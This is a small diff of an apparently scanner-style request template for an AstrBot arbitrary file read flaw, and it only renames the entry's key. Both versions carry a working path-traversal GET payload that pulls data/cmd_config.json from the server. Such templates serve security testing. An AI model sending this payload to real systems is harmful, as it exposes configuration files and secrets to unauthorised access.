@@ -1,5 +1,5 @@
 Requests:
-  AstrBot任意文件读取:
+  AstrBot任意文件读取漏洞:
     URL: "api/chat/get_file?filename=../../../data/cmd_config.json"
     Method: "GET"
     User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
